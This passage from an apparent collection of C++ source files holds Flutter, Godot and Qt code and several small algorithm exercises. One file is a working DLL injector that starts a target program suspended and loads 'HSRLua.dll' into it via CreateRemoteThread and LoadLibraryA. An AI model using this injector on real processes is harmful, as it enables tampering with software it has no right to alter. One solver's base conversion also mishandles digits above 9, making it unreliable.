flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\nstruct Node \n{\n    int data;\n    Node* next;\n    Node(int val) : data(val), next(nullptr) {}\n};\nclass SinglyLinkedList \n{\nprivate:\n    Node* head;\npublic:\n    SinglyLinkedList() : head(nullptr) {}\n    void insert_front(int data) \n    {\n        Node* new_node = new Node(data);\n        new_node->next = head;\n        head = new_node;\n    }\n    void insert_end(int data) \n    {\n        Node* new_node = new Node(data);\n        if (!head) \n        {\n            head = new_node;\n            return;\n        }\n        Node* last = head;\n        while (last->next) \n        {\n            last = last->next;\n        }\n        last->next = new_node;\n    }\n    void insert_before(int target, int data) \n    {\n        if (!head) return;\n\n        if (head->data == target) \n        {\n            insert_front(data);\n            return;\n        }\n        Node* prev = nullptr;\n        Node* current = head;\n        while (current && current->data != target) \n        {\n            prev = current;\n            current = current->next;\n        }\n        if (current) \n        {\n            Node* new_node = new Node(data);\n            prev->next = new_node;\n            new_node->next = current;\n        }\n    }\n    void insert_after(int target, int data) \n    {\n        Node* current = head;\n        while (current && current->data != target) \n        {\n            current = current->next;\n        }\n        if (current) \n        {\n            Node* new_node = new Node(data);\n            new_node->next = current->next;\n            current->next = new_node;\n        }\n    }\n    void delete_head() \n    {\n        if (head) \n        {\n            Node* temp = head;\n            head = head->next;\n            delete temp;\n        }\n    }\n    void delete_last() \n    {\n        if (!head) return;\n        if (!head->next) \n        {  \n            delete head;\n            head = nullptr;\n            return;\n        }\n        Node* second_last = head;\n        while (second_last->next->next) \n        {\n            second_last = second_last->next;\n        }\n        delete second_last->next;\n        second_last->next = nullptr;\n    }\n    void delete_value(int value) \n    {\n        if (!head) return;\n        if (head->data == value) \n        {\n            delete_head();\n            return;\n        }\n        Node* prev = nullptr;\n        Node* current = head;\n        while (current && current->data != value) \n        {\n            prev = current;\n            current = current->next;\n        }\n        if (current) \n        {\n            prev->next = current->next;\n            delete current;\n        }\n    }\n    int count_nodes() \n    {\n        int count = 0;\n        Node* current = head;\n        while (current) \n        {\n            count++;\n            current = current->next;\n        }\n        return count;\n    }\n    void display() \n    {\n        Node* current = head;\n        while (current) \n        {\n            cout << current->data << \" -> \";\n            current = current->next;\n        }\n        cout << \"NULL\" << endl;\n    }\n};\nint main() \n{\n    SinglyLinkedList ll;\n    ll.insert_front(3);\n    ll.insert_front(2);\n    ll.insert_end(5);\n    ll.insert_after(3, 4);\n    ll.insert_before(5, 6);\n    ll.display();\n    ll.delete_head();\n    ll.delete_last();\n    ll.delete_value(4);\n    ll.display();\n    cout << \"Number of nodes: \" << ll.count_nodes() << endl;\n    return 0;\n}\n",
    "#include <Windows.h>\n#include <iostream>\n#include <filesystem>\n#include <optional>\n#include <fstream>\n\n#include \"../HSRLua/util.hpp\"\n\nnamespace fs = std::filesystem;\n\nbool InjectStandard(HANDLE hTarget, const char* dllpath)\n{\n    LPVOID loadlib = GetProcAddress(GetModuleHandle(L\"kernel32\"), \"LoadLibraryA\");\n\n    LPVOID dllPathAddr = VirtualAllocEx(hTarget, NULL, strlen(dllpath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (dllPathAddr == NULL)\n    {\n        std::cout << \"Failed allocating memory in the target process. GetLastError(): \" << GetLastError() << \"\\n\";\n        return false;\n    }\n\n    if (!WriteProcessMemory(hTarget, dllPathAddr, dllpath, strlen(dllpath) + 1, NULL))\n    {\n        std::cout << \"Failed writing to process. GetLastError(): \" << GetLastError() << \"\\n\";\n        return false;\n    }\n\n    HANDLE hThread = CreateRemoteThread(hTarget, NULL, NULL, (LPTHREAD_START_ROUTINE)loadlib, dllPathAddr, NULL, NULL);\n    if (hThread == NULL)\n    {\n        std::cout << \"Failed to create a thread in the target process. GetLastError(): \" << GetLastError() << \"\\n\";\n        return false;\n    }\n\n    WaitForSingleObject(hThread, INFINITE);\n\n    DWORD exit_code = 0;\n    GetExitCodeThread(hThread, &exit_code);\n\n    VirtualFreeEx(hTarget, dllPathAddr, 0, MEM_RELEASE);\n    CloseHandle(hThread);\n\n    if (exit_code == 0)\n    {\n        std::cout << \"LoadLibrary failed.\\n\";\n        return false;\n    }\n    return true;\n}\n\nint main()\n{\n    auto current_dir = util::this_dir();\n    if (!current_dir)\n        return 0;\n\n    auto dll_path = current_dir.value() / \"HSRLua.dll\";\n    if (!fs::is_regular_file(dll_path))\n    {\n        printf(\"HSRLua.dll not found\\n\");\n        system(\"pause\");\n        return 0;\n    }\n\n    auto settings_path = current_dir.value() / \"settings.txt\";\n    if (!fs::is_regular_file(settings_path))\n    {\n        printf(\"settings.txt not found\\n\");\n        system(\"pause\");\n        return 0;\n    }\n\n    auto settings = util::read_whole_file(settings_path);\n    if (!settings)\n    {\n        printf(\"Failed reading settings.txt\\n\");\n        system(\"pause\");\n        return 0;\n    }\n\n    std::string exe_path;\n    std::getline(std::stringstream(settings.value()), exe_path);\n    if (!fs::is_regular_file(exe_path))\n    {\n        printf(\"Target executable not found\\n\");\n        system(\"pause\");\n        return 0;\n    }\n\n    PROCESS_INFORMATION proc_info{};\n    STARTUPINFOA startup_info{};\n    CreateProcessA(exe_path.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup_info, &proc_info);\n\n    InjectStandard(proc_info.hProcess, dll_path.string().c_str());\n    ResumeThread(proc_info.hThread);\n    CloseHandle(proc_info.hThread);\n    CloseHandle(proc_info.hProcess);\n    return 0;\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\nstruct Contact {\r\n    std::string name;\r\n    std::string phoneNumber;\r\n};\r\n\r\nclass Phonebook {\r\nprivate:\r\n    std::vector<Contact> contacts;\r\n\r\npublic:\r\n    void addContact(const Contact &contact) {\r\n        contacts.push_back(contact);\r\n    }\r\n\r\n    void displayContacts() {\r\n        for (const auto &contact : contacts) {\r\n            std::cout << \"Name: \" << contact.name << \", Phone: \" << contact.phoneNumber << std::endl;\r\n        }\r\n    }\r\n\r\n    bool removeContact(const std::string &name) {\r\n        for (auto it = contacts.begin(); it != contacts.end(); ++it) {\r\n            if (it->name == name) {\r\n                contacts.erase(it);\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    Contact* searchContact(const std::string &name) {\r\n        for (auto &contact : contacts) {\r\n            if (contact.name == name) {\r\n                return &contact;\r\n            }\r\n        }\r\n        return nullptr;\r\n    }\r\n};\r\n\r\nint main() {\r\n    Phonebook phonebook;\r\n    int choice;\r\n    do {\r\n        std::cout << \"Phonebook Menu:\\n\";\r\n        std::cout << \"1. Add Contact\\n\";\r\n        std::cout << \"2. Display All Contacts\\n\";\r\n        std::cout << \"3. Search Contact\\n\";\r\n        std::cout << \"4. Remove Contact\\n\";\r\n        std::cout << \"5. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1: {\r\n                std::string name, phone;\r\n                std::cout << \"Enter name: \";\r\n                std::cin.ignore(); // clear the buffer\r\n                getline(std::cin, name);\r\n                std::cout << \"Enter phone number: \";\r\n                getline(std::cin, phone);\r\n                phonebook.addContact({name, phone});\r\n                break;\r\n            }\r\n            case 2: {\r\n                phonebook.displayContacts();\r\n                break;\r\n            }\r\n            case 3: {\r\n                std::string name;\r\n                std::cout << \"Enter name: \";\r\n                std::cin.ignore(); // clear the buffer\r\n                getline(std::cin, name);\r\n                Contact* contact = phonebook.searchContact(name);\r\n                if (contact) {\r\n                    std::cout << \"Name: \" << contact->name << \", Phone: \" << contact->phoneNumber << std::endl;\r\n                } else {\r\n                    std::cout << \"Contact not found.\\n\";\r\n                }\r\n                break;\r\n            }\r\n            case 4: {\r\n                std::string name;\r\n                std::cout << \"Enter name: \";\r\n                std::cin.ignore(); // clear the buffer\r\n                getline(std::cin, name);\r\n                if (phonebook.removeContact(name)) {\r\n                    std::cout << \"Contact removed successfully.\\n\";\r\n                } else {\r\n                    std::cout << \"Contact not found.\\n\";\r\n                }\r\n                break;\r\n            }\r\n            case 5:\r\n                std::cout << \"Exiting...\\n\";\r\n                break;\r\n            default:\r\n                std::cout << \"Invalid choice. Try again.\\n\";\r\n                break;\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <string>\n\nusing namespace std;\n\n// Function to convert a string of a given base to decimal\nint baseToDecimal(string value, int base) {\n    int result = 0;\n    for (int i = 0; i < value.size(); ++i) {\n        result = result * base + (value[i] - '0');\n    }\n    return result;\n}\n\n// Function to perform Gaussian Elimination\nvector<double> gaussianElimination(vector<vector<double>>& matrix) {\n    int n = matrix.size();\n\n    // Forward elimination\n    for (int i = 0; i < n; ++i) {\n        // Make the diagonal element 1\n        double diagElement = matrix[i][i];\n        for (int j = 0; j <= n; ++j) {\n            matrix[i][j] /= diagElement;\n        }\n\n        // Make the elements below the diagonal 0\n        for (int k = i + 1; k < n; ++k) {\n            double factor = matrix[k][i];\n            for (int j = 0; j <= n; ++j) {\n                matrix[k][j] -= factor * matrix[i][j];\n            }\n        }\n    }\n\n    // Back substitution\n    vector<double> result(n);\n    for (int i = n - 1; i >= 0; --i) {\n        result[i] = matrix[i][n];\n        for (int j = i + 1; j < n; ++j) {\n            result[i] -= matrix[i][j] * result[j];\n        }\n    }\n\n    return result;\n}\n\nint main() {\n    // Input the number of points (n) and degree + 1 (k)\n    int n, k;\n    cout << \"Enter number of points (n): \";\n    cin >> n;\n    cout << \"Enter minimum number of points to solve (k): \";\n    cin >> k;\n   \n    vector<pair<int, int>> points;  // To store the x and y values as pairs\n\n    // Read points from user input\n    for (int i = 0; i < n; ++i) {\n        int x, base;\n        string valueStr;\n       \n        cout << \"Enter x for point \" << i + 1 << \": \";\n        cin >> x;\n        cout << \"Enter base for y value (e.g., 10 for decimal, 2 for binary): \";\n        cin >> base;\n        cout << \"Enter y value as a string: \";\n        cin >> valueStr;\n\n        // Decode y value from the given base\n        int y = baseToDecimal(valueStr, base);\n\n        // Store the (x, y) pair\n        points.push_back(make_pair(x, y));\n    }\n\n    // We need at least 'k' points to solve for a polynomial of degree 'k-1'\n    if (points.size() < k) {\n        cerr << \"Error: Insufficient number of points provided!\" << endl;\n        return 1;\n    }\n\n    // Create the matrix for Gaussian elimination\n    vector<vector<double>> matrix(k, vector<double>(k + 1, 0));\n\n    // Fill the matrix with equations using the points\n    for (int i = 0; i < k; ++i) {\n        int x = points[i].first;\n        int y = points[i].second;\n\n        // Fill each row with the powers of x\n        for (int j = 0; j < k; ++j) {\n            matrix[i][j] = pow(x, k - 1 - j);\n        }\n        matrix[i][k] = y;  // The result (y value)\n    }\n\n    // Solve the system using Gaussian elimination\n    vector<double> coefficients = gaussianElimination(matrix);\n\n    // Output the coefficients of the polynomial\n    cout << \"The polynomial coefficients are:\" << endl;\n    for (int i = 0; i < coefficients.size(); ++i) {\n        cout << \"a_\" << (k - 1 - i) << \" = \" << coefficients[i] << endl;\n    }\n\n    // The constant term 'c' is the last coefficient\n    cout << \"The constant term (c) is: \" << coefficients[k - 1] << endl;\n\n    return 0;\n}\n",
    "/**************************************************************************/\n/*  vector3i.cpp                                                          */\n/**************************************************************************/\n/*                         This file is part of:                          */\n/*                             GODOT ENGINE                               */\n/*                        https://godotengine.org                         */\n/**************************************************************************/\n/* Copyright (c) 2014-present Godot Engine contributors (see AUTHORS.md). */\n/* Copyright (c) 2007-2014 Juan Linietsky, Ariel Manzur.                  */\n/*                                                                        */\n/* Permission is hereby granted, free of charge, to any person obtaining  */\n/* a copy of this software and associated documentation files (the        */\n/* \"Software\"), to deal in the Software without restriction, including    */\n/* without limitation the rights to use, copy, modify, merge, publish,    */\n/* distribute, sublicense, and/or sell copies of the Software, and to     */\n/* permit persons to whom the Software is furnished to do so, subject to  */\n/* the following conditions:                                              */\n/*                                                                        */\n/* The above copyright notice and this permission notice shall be         */\n/* included in all copies or substantial portions of the Software.        */\n/*                                                                        */\n/* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,        */\n/* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF     */\n/* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. */\n/* IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY   */\n/* CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,   */\n/* TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE      */\n/* SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.                 */\n/**************************************************************************/\n\n#include <godot_cpp/variant/vector3i.hpp>\n\n#include <godot_cpp/variant/string.hpp>\n#include <godot_cpp/variant/vector3.hpp>\n\nnamespace godot {\n\nVector3i Vector3i::snapped(const Vector3i &p_step) const {\n\treturn Vector3i(\n\t\t\tMath::snapped(x, p_step.x),\n\t\t\tMath::snapped(y, p_step.y),\n\t\t\tMath::snapped(z, p_step.z));\n}\n\nVector3i Vector3i::snappedi(int32_t p_step) const {\n\treturn Vector3i(\n\t\t\tMath::snapped(x, p_step),\n\t\t\tMath::snapped(y, p_step),\n\t\t\tMath::snapped(z, p_step));\n}\n\nVector3i::Axis Vector3i::min_axis_index() const {\n\treturn x < y ? (x < z ? Vector3i::AXIS_X : Vector3i::AXIS_Z) : (y < z ? Vector3i::AXIS_Y : Vector3i::AXIS_Z);\n}\n\nVector3i::Axis Vector3i::max_axis_index() const {\n\treturn x < y ? (y < z ? Vector3i::AXIS_Z : Vector3i::AXIS_Y) : (x < z ? Vector3i::AXIS_Z : Vector3i::AXIS_X);\n}\n\nVector3i Vector3i::clamp(const Vector3i &p_min, const Vector3i &p_max) const {\n\treturn Vector3i(\n\t\t\tCLAMP(x, p_min.x, p_max.x),\n\t\t\tCLAMP(y, p_min.y, p_max.y),\n\t\t\tCLAMP(z, p_min.z, p_max.z));\n}\n\nVector3i Vector3i::clampi(int32_t p_min, int32_t p_max) const {\n\treturn Vector3i(\n\t\t\tCLAMP(x, p_min, p_max),\n\t\t\tCLAMP(y, p_min, p_max),\n\t\t\tCLAMP(z, p_min, p_max));\n}\n\nVector3i::operator String() const {\n\treturn \"(\" + itos(x) + \", \" + itos(y) + \", \" + itos(z) + \")\";\n}\n\nVector3i::operator Vector3() const {\n\treturn Vector3(x, y, z);\n}\n\n} // namespace godot\n",
    "\ufeff#include \"qwmainwind.h\"\n#include \"ui_qwmainwind.h\"\n\n#include    <QFile>\n#include    <QFileDialog>\n#include    <QTextStream>\n#include    <QFontDialog>\n#include    <QCoreApplication>\n#include    <QVBoxLayout>\n#include    <QTextCharFormat>\n\n\nvoid QWMainWind::updateCurFile(QString aFile)\n{//\u66f4\u65b0\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5e76\u66f4\u65b0\u72b6\u6001\u680f\u63d0\u793a\n    fCurFileName=aFile;\n    fLabCurFile->setText(\"\u5f53\u524d\u6587\u4ef6\uff1a\"+fCurFileName);\n}\n\nvoid QWMainWind::iniUI()\n{\n//\u72b6\u6001\u680f\n    fLabCurFile=new QLabel;  //\u7528\u4e8e\u663e\u793a\u5f53\u524d\u6587\u4ef6\u540d\u7684\u6807\u7b7e\n    fLabCurFile->setMinimumWidth(150);\n    fLabCurFile->setText(\"\u5f53\u524d\u6587\u4ef6\uff1a\");\n    ui->statusBar->addWidget(fLabCurFile);//\u6dfb\u52a0\u5230\u72b6\u6001\u680f\n\n    progressBar1=new QProgressBar;//\u72b6\u6001\u680f\u4e0a\u7684\u8fdb\u5ea6\u6761\n    progressBar1->setMaximumWidth(200);//\u8bbe\u7f6e\u7ec4\u4ef6\u6700\u5927\u5bbd\u5ea6\n    progressBar1->setMinimum(5);\n    progressBar1->setMaximum(50);\n    progressBar1->setValue(ui->txtEdit->font().pointSize());//\u521d\u59cb\u503c\n    ui->statusBar->addWidget(progressBar1); //\u6dfb\u52a0\u5230\u72b6\u6001\u680f\n\n//\u5de5\u5177\u680f\n    spinFontSize = new QSpinBox;// \u5de5\u5177\u680f\u4e0a\u7684\u6587\u5b57\u5927\u5c0f SpinBox\n    spinFontSize->setMinimum(5);\n    spinFontSize->setMaximum(50);\n    spinFontSize->setValue(ui->txtEdit->font().pointSize());//\u521d\u59cb\u503c\n    spinFontSize->setMinimumWidth(50);//\u8bbe\u7f6e\u7ec4\u4ef6\u6700\u5c0f\u5bbd\u5ea6\n\n    ui->mainToolBar->addWidget(new QLabel(\"\u5b57\u4f53\u5927\u5c0f \")); //\u4e0d\u5f15\u7528\u7684Label\u65e0\u9700\u5b9a\u4e49\u53d8\u91cf\n    ui->mainToolBar->addWidget(spinFontSize); //SpinBox\u6dfb\u52a0\u5230\u5de5\u5177\u680f\n\n    ui->mainToolBar->addSeparator(); //\u5de5\u5177\u680f\u4e0a\u589e\u52a0\u5206\u9694\u6761\n    ui->mainToolBar->addWidget(new QLabel(\" \u5b57\u4f53 \"));\n    comboFont = new QFontComboBox;//\u5b57\u4f53\u540d\u79f0ComboBox\n    comboFont->setMinimumWidth(150); //\u8bbe\u7f6e\u7ec4\u4ef6\u6700\u5c0f\u5bbd\u5ea6\n    ui->mainToolBar->addWidget(comboFont);//\u6dfb\u52a0\u5230\u5de5\u5177\u680f\n\n    setCentralWidget(ui->txtEdit); //\u5c06txtEdit\u8bbe\u7f6e\u4e3a\u4e2d\u5fc3\u7ec4\u4ef6\uff0c\u81ea\u52a8\u586b\u5145\u6574\u4e2a\u5de5\u4f5c\u533a\n}\n\nvoid QWMainWind::iniSignalSlots()\n{ //\u4fe1\u53f7\u4e0e\u69fd\u7684\u5173\u8054\uff0c\u5f53\u51fd\u6570\u5e26\u6709\u53c2\u6570\u65f6\uff0c\u5fc5\u987b\u5199\u660e\u53c2\u6570\u7684\u7c7b\u578b\n    connect(spinFontSize,SIGNAL(valueChanged(int)),\n            this,SLOT(on_spinBoxFontSize_valueChanged(int)));\n\n    connect(comboFont,SIGNAL(currentIndexChanged(const QString &)),\n            this,SLOT(on_comboFont_currentIndexChanged(const QString &)));\n}\n\nQWMainWind::QWMainWind(QWidget *parent) :\n    QMainWindow(parent),\n    ui(new Ui::QWMainWind)\n{\n    ui->setupUi(this);\n\n    iniUI();//\u624b\u5de5\u521d\u59cb\u5316UI\n\n    iniSignalSlots();//\u4fe1\u53f7\u4e0e\u69fd\u5173\u8054\n}\n\nQWMainWind::~QWMainWind()\n{\n    delete ui;\n}\n\nvoid QWMainWind::on_txtEdit_copyAvailable(bool b)\n{//\u6709\u6587\u5b57\u53efcopy\u65f6\u66f4\u65b0cut,copy\u7684Enable\u72b6\u6001\n    ui->actCut->setEnabled(b); //\u80fd\u5426 cut\n    ui->actCopy->setEnabled(b);  //\u80fd\u5426copy\n\n    ui->actPaste->setEnabled(ui->txtEdit->canPaste()); //\u80fd\u5426paste\n}\n\nvoid QWMainWind::on_actOpen_triggered()\n{\n    QString curPath,aFileName;\n    curPath=QCoreApplication::applicationDirPath(); //\u83b7\u53d6\u5e94\u7528\u7a0b\u5e8f\u7684\u8def\u5f84\n\n//\u8c03\u7528\u6253\u5f00\u6587\u4ef6\u5bf9\u8bdd\u6846\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\n    aFileName=QFileDialog::getOpenFileName(this,tr(\"\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\"),curPath,\n                 \"C++\u7a0b\u5e8f\u6587\u4ef6(*.cpp);;H\u5934\u6587\u4ef6(*.h);;\u6587\u672c\u6587\u4ef6(*.txt);;\u6240\u6709\u6587\u4ef6(*.*)\");\n\n    if (!aFileName.isEmpty())\n    {\n        QFile aFile(aFileName);  //\u4ee5\u6587\u4ef6\u65b9\u5f0f\u8bfb\u51fa\n        if (aFile.open(QIODevice::ReadWrite | QIODevice::Text))\n        {\n            QTextStream aStream(&aFile); //\u7528\u6587\u672c\u6d41\u8bfb\u53d6\u6587\u4ef6\n            while (!aStream.atEnd())\n                ui->txtEdit->append(aStream.readLine()); //\u8bfb\u53d6\u4e00\u4e2a\u6587\u672c\u884c\n            updateCurFile(aFileName); //\u66f4\u65b0\u72b6\u6001\u680f\u663e\u793a\n        }\n        aFile.close();\n    }\n}\n\nvoid QWMainWind::on_actFont_triggered()\n{\n    bool    ok;\n    QFont font = QFontDialog::getFont(&ok, this);\n    if (ok)\n        ui->txtEdit->setFont(font);\n\n}\n\nvoid QWMainWind::on_actNew_triggered()\n{//\u65b0\u5efa\u6587\u4ef6\n    ui->txtEdit->clear();\n    updateCurFile(\"\");\n}\n\nvoid QWMainWind::on_spinBoxFontSize_valueChanged(int aFontSize)\n{//\u6539\u53d8\u5b57\u4f53\u5927\u5c0f\u7684SpinBox\u7684\u54cd\u5e94\n    QTextCharFormat fmt;\n    fmt.setFontPointSize(aFontSize); //\u8bbe\u7f6e\u5b57\u4f53\u5927\u5c0f\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n    progressBar1->setValue(aFontSize);\n}\n\nvoid QWMainWind::on_comboFont_currentIndexChanged(const QString &arg1)\n{//FontCombobox\u7684\u54cd\u5e94\uff0c\u9009\u62e9\u5b57\u4f53\u540d\u79f0\n    QTextCharFormat fmt;\n    fmt.setFontFamily(arg1);//\u8bbe\u7f6e\u5b57\u4f53\u540d\u79f0\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\n\nvoid QWMainWind::on_actToolbarLab_triggered(bool checked)\n{\n    if (checked)  //\u663e\u793a\u6587\u5b57\u548c\u56fe\u6807\n        ui->mainToolBar->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\n    else //\u53ea\u663e\u793a\u56fe\u6807\n        ui->mainToolBar->setToolButtonStyle(Qt::ToolButtonIconOnly);\n}\n\nvoid QWMainWind::on_actFontBold_triggered(bool checked)\n{\n    QTextCharFormat fmt; //\u683c\u5f0f\n    fmt=ui->txtEdit->currentCharFormat();//\u83b7\u53d6\u5f53\u524d\u9009\u62e9\u6587\u5b57\u7684\u683c\u5f0f\n\n    if (checked) // \u76f8\u5f53\u4e8e\u8c03\u7528ui->actFontBold->isChecked();\u8bfb\u53d6Action\u7684check\u72b6\u6001\n        fmt.setFontWeight(QFont::Bold);\n    else\n        fmt.setFontWeight(QFont::Normal);\n\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\nvoid QWMainWind::on_actFontItalic_triggered(bool checked)\n{\n    QTextCharFormat fmt;\n    fmt=ui->txtEdit->currentCharFormat();\n    fmt.setFontItalic(checked);\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\nvoid QWMainWind::on_actFontUnder_triggered(bool checked)\n{\n    QTextCharFormat fmt;\n    fmt=ui->txtEdit->currentCharFormat();\n    fmt.setFontUnderline(checked);\n    ui->txtEdit->mergeCurrentCharFormat(fmt);\n}\n\n\nvoid QWMainWind::on_txtEdit_selectionChanged()\n{//\u5f53\u524d\u9009\u62e9\u7684\u6587\u5b57\u53d1\u751f\u53d8\u5316,\u66f4\u65b0\u7c97\u4f53\u3001\u659c\u4f53\u3001\u4e0b\u5212\u7ebf3\u4e2aaction\u7684checked\u72b6\u6001\n    QTextCharFormat fmt;\n    fmt=ui->txtEdit->currentCharFormat(); //\u83b7\u53d6\u6587\u5b57\u7684\u683c\u5f0f\n\n    ui->actFontItalic->setChecked(fmt.fontItalic()); //\u662f",
    "#include <iostream>\n#include <vector>\n#include <map>\n#include <string>\n#include <cmath>\n#include <algorithm>\n\nusing namespace std;\n\n// Function to decode the Y value based on its base\nlong long decodeValue(const string& value, int base) {\n    return stoll(value, nullptr, base);  // Convert string in the given base to long long\n}\n\n// Lagrange Interpolation function to find the constant term 'c'\nlong long lagrangeInterpolation(const vector<pair<int, long long>>& points, int k) {\n    long long constantTerm = 0;\n\n    for (int i = 0; i < k; i++) {\n        int xi = points[i].first;\n        long long yi = points[i].second;\n\n        double li = 1.0;\n        for (int j = 0; j < k; j++) {\n            if (i != j) {\n                int xj = points[j].first;\n                li *= (0.0 - xj) / (xi - xj); // Evaluating L_i(0)\n            }\n        }\n\n        // Summing up the terms for the constant term\n        constantTerm += yi * li;\n    }\n\n    return constantTerm;\n}\n\nint main() {\n    // Example input in the format given by the problem\n    map<string, map<string, string>> input = {\n        {\"keys\", {{\"n\", \"9\"}, {\"k\", \"6\"}}},\n        {\"1\", {{\"base\", \"10\"}, {\"value\", \"28735619723837\"}}},\n        {\"2\", {{\"base\", \"16\"}, {\"value\", \"1A228867F0CA\"}}},\n        {\"3\", {{\"base\", \"12\"}, {\"value\", \"32811A4AA0B7B\"}}},\n        {\"4\", {{\"base\", \"11\"}, {\"value\", \"917978721331A\"}}},\n        {\"5\", {{\"base\", \"16\"}, {\"value\", \"1A22886782E1\"}}},\n        {\"6\", {{\"base\", \"10\"}, {\"value\", \"28735619654702\"}}},\n        {\"7\", {{\"base\", \"14\"}, {\"value\", \"71AB5070CC4B\"}}},\n        {\"8\", {{\"base\", \"9\"}, {\"value\", \"122662581541670\"}}},\n        {\"9\", {{\"base\", \"8\"}, {\"value\", \"642121030037605\"}}}\n    };\n\n    int n = stoi(input[\"keys\"][\"n\"]);\n    int k = stoi(input[\"keys\"][\"k\"]);\n\n    vector<pair<int, long long>> points;\n\n    // Decoding the points (x, y)\n    for (auto& item : input) {\n        if (item.first != \"keys\") {\n            int x = stoi(item.first);  // x is the key\n            int base = stoi(item.second[\"base\"]);\n            string value = item.second[\"value\"];\n            long long y = decodeValue(value, base);  // Decode y based on base\n            points.push_back({x, y});\n        }\n    }\n\n    // Sort the points by x for consistency (optional, not required)\n    sort(points.begin(), points.end());\n\n    // Use Lagrange interpolation to find the constant term (c)\n    long long constantTerm = lagrangeInterpolation(points, k);\n\n    // Output the result\n    cout << \"The constant term (c) is: \" << constantTerm << endl;\n\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    